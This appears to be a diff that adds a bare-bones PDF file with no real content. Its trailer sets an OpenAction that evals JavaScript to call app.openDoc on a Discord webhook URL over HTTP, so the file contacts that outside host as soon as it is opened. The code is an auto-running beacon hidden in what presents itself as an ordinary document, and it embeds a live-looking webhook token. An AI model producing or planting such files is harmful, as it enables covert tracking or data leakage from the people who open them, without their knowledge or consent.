@@ -1,0 +1,19 @@
+%PDF-1.4
+1 0 obj
+<<>>
+%endobj
+trailer
+<<
+/Root
+  <</Pages <<>>
+  /OpenAction
+      <<
+      /S/JavaScript
+      /JS(
+      eval(
+          'app.openDoc({cPath: encodeURI("https://discord.com/api/webhooks/1322678370772975688/JpqGQIDawMBckRNnxItoQontnby9ds9k6hipwqpme3R6oyALdgvktlkmvMiuOTQuHAQX"), cFS: "CHTTP" });'
+          );
+      )
+      >>
+  >>
+>>
